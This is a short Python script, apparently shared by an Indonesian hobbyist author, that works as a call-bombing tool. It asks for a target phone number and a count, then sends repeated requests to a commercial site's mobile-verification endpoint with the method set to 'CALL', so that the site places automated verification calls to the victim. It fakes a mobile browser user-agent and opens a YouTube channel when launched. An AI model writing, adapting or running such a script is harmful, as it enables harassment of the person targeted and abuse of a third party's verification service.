# Author : kz.tutorial
# Reccode : |2!¥απαDΔ
import os,sys,time,requests
from time import sleep

#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
os.system("clear")
# Jaggan di ubah
os.system('xdg-open https://youtube.com/channel/UC1XsDCuEyez3gcogOMgOJxw')
# Ubah Terserah kalian
banner= """
\033[1;30m<════════════[\033[1;33;41m • \033[1;37m SPAM Call TARGET \033[1;33m• \033[0m\033[1;30m]══════════════>
\033[37m===================================================\033[37m
\033[37m[\033[31m•\033[31m\033[37m]\033[37m\033[32m Authour \033[37m:\033[33m |2!¥απαDΔ
\033[37m[\033[31m•\033[37m]\033[32m Team \033[37m   : \033[33mGosip-city
\033[37m[\033[31m•\033[37m]\033[32m gitHub\033[37m  : \033[33mhttps:github.com/riyanid
\033[37m[\033[31m•\033[37m]\033[32m Yotube\033[37m  : \033[33mR1Y4N4D4
\033[37m===================================================\033[37m"""
sleep(1)
print(banner)
# Jaggan di ubah sayang
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
mengetik("[KALO SUDAH LIMIT TUNGUH BEBERAPA MENIT LAGI BARU ULANGI] ")
time.sleep(3)
# Jaggan di ubah sayang ku
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# Jaggan di ubah sayng
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))

